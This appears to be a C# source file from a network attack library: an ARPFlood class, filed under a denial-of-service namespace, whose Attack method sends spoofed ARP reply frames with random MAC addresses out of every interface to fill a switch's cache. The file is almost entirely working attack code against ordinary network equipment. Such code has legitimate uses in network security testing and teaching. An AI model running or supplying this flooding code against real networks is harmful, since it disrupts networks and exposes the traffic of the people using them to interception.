using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using eExNetworkLibrary.IP;
using System.Timers;
using eExNetworkLibrary.Utilities;
using eExNetworkLibrary.Ethernet;
using eExNetworkLibrary.ARP;
using eExNetworkLibrary.CommonTrafficAnalysis;

namespace eExNetworkLibrary.Attacks.DoS
{
    /// <summary>
    /// This class is capable of converting a Switch into a Router by flooding
    /// it with spoofed ARP reply packets and filling its ARP cache.
    /// </summary>
    public class ARPFlood : DirectInterfaceIOHandler
    {
        public void Attack(uint frameCount)
        {
            EthernetFrame ethFrame;
            ARPFrame arpFrame;

            for (uint i = 0; i < frameCount; i++) {            
                foreach (EthernetInterface ipi in lInterfaces) {
                    MACAddress sourceMAC = MACAddress.Random;
                    ethFrame = new EthernetFrame();
                    ethFrame.CanocialFormatIndicator = false;
                    ethFrame.Destination = MACAddress.Broadcast;
                    ethFrame.Source = sourceMAC;
                    ethFrame.VlanTagExists = false;
                    ethFrame.EtherType = EtherType.ARP;

                    arpFrame = new ARPFrame();
                    arpFrame.DestinationIP = new IPAddress(0);

                    arpFrame.DestinationMAC = MACAddress.Random;
                
                    arpFrame.SourceIP = IPAddress.Parse("0.0.0.0");
                    arpFrame.SourceMAC = sourceMAC;
                    arpFrame.ProtocolAddressType = EtherType.IPv4;
                    arpFrame.HardwareAddressType = HardwareAddressType.Ethernet;

                    arpFrame.Operation = ARPOperation.Reply;
                    ethFrame.EncapsulatedFrame = arpFrame;

                    ipi.Send(ethFrame);
                }
            }
        }

        public void ResumeAttack()
        {
            throw new Exception("The method or operation is not implemented.");
        }
    }
   
}
